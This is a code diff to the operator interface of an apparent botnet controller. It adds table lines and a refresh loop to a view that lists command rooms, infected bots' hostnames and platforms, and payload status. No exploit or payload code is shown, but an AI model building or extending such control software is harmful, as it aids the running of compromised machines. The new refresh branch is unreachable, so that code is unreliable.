@@ -117,7 +117,7 @@ class BotnetGUI:
             self.console.clear()
             self.console.print(Align.center(Panel(f"[bold green]Bots in Room: {room.room.name}[/]", expand=True)))
 
-            bot_table = Table()
+            bot_table = Table(show_lines=True)
             bot_table.add_column("Bot ID", style="bold cyan")
             bot_table.add_column("Hostname", style="bold cyan")
             bot_table.add_column("Platform", style="bold cyan")
@@ -143,38 +143,41 @@ class BotnetGUI:
                 return
 
     def show_state(self):
-        try:
-            self.console.clear()
-            self.console.print(Align.center(Panel("[bold green]Botnet State[/]", expand=True)))
-            
-            table = Table()
-            table.add_column("Room Name", style="bold cyan")
-            table.add_column("Bot Count", justify="center", style="bold magenta")
-            table.add_column("Payload Status", justify="center")
-            
-            total_bots = 0
-            room_list = list(self.controller.command_rooms.items())
-            for _, room in room_list:
-                bot_count = len(room.bots)
-                total_bots += bot_count
-                status = "[bold green]● Active[/]" if room.payload_status else "[bold red]● Inactive[/]"
-                table.add_row(room.room.name[len(self.commandroom_prefix):], str(bot_count), status)
-            
-            self.console.print(Align.center(table))
-            self.console.print(f"[bold cyan]Total Bots: {total_bots}[/]")
+        while True:
+            try:
+                self.console.clear()
+                self.console.print(Align.center(Panel("[bold green]Botnet State[/]", expand=True)))
+                
+                table = Table()
+                table.add_column("Room Name", style="bold cyan")
+                table.add_column("Bot Count", justify="center", style="bold magenta")
+                table.add_column("Payload Status", justify="center")
+                
+                total_bots = 0
+                room_list = list(self.controller.command_rooms.items())
+                for _, room in room_list:
+                    bot_count = len(room.bots)
+                    total_bots += bot_count
+                    status = "[bold green]● Active[/]" if room.payload_status else "[bold red]● Inactive[/]"
+                    table.add_row(room.room.name[len(self.commandroom_prefix):], str(bot_count), status)
+                
+                self.console.print(Align.center(table))
+                self.console.print(f"[bold cyan]Total Bots: {total_bots}[/]")
 
-            room_names = [room.room.name[len(self.commandroom_prefix):] for _, room in room_list]
-            room_name = Prompt.ask("[bold white]Enter the room name to view bots (or press Enter to return)", choices=room_names + [""])
-            
-            if room_name != "":
-                room_name =  self.commandroom_prefix + room_name
-                selected_room = [room for _, room in room_list if room.room.name == room_name][0]
-                self.show_bot_status_in_room(selected_room)
-            else:
-                return
+                room_names = [room.room.name[len(self.commandroom_prefix):] for _, room in room_list]
+                room_name = Prompt.ask("[bold white]Enter the room name to view bots (press r to refresh or Enter to return)", choices=room_names + ["r", ""])
+                
+                if room_name != "":
+                    room_name =  self.commandroom_prefix + room_name
+                    selected_room = [room for _, room in room_list if room.room.name == room_name][0]
+                    self.show_bot_status_in_room(selected_room)
+                elif room_name == "r":
+                    continue
+                else:
+                    return
 
-        except Exception as e:
-            self.console.print(f"[bold red]Error:[/] {str(e)}")
+            except Exception as e:
+                self.console.print(f"[bold red]Error:[/] {str(e)}")
     
     def create_room(self):
         try:
